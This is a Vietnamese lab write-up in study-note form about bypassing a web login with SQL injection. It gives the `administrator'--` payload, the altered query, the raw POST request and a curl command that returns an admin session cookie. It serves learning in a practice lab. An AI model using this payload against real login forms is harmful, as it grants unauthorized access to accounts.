![[lab-sqli-login-bypass.png]]
Lab login, chèn username để vào thẳng administrator không cần password.

> [!NOTE] phân tích đề
> - form login query kiểu `SELECT ... WHERE username='...' AND password='...'`.
> - mình control được username.
> -sau khi quan sát form login này, mình thấy query check cả username lẫn password, nên mình dùng `administrator'--` để biến đoạn check password thành comment.
> - liên quan [[lys thuyet sql injection]] và [[các kỹ thuật chèn sql]].

### hướng giải
- [ ] mở login, intercept POST /login.
- [ ] thử username `administrator'--` password bừa.
- [ ] xem response có session admin không.
- [ ] vào /my-account verify.

### giải
request gốc:
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```
-> báo invalid.

payload:
```
username=administrator'--&password=xyz
```
query thành:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='xyz'
```
-> `--` cắt đuôi check password.
-> chỉ check username.
=> response 302 về /my-account.
-> hiện Logged in as administrator.
=> solved.

lệnh test nhanh bằng curl:
```bash
curl -X POST https://xxx.web-security-academy.net/login \
  -d "username=administrator'--&password=aaa" -i
```
-> thấy `Set-Cookie: session=...admin...`.

> [!NOTE] bài học
> - login bypass = comment password.
> - nhớ có space sau `--` ở MySQL, còn lab này `--` là đủ.
> - sau bài này qua [[Lab-SQLi UNION determine columns]].
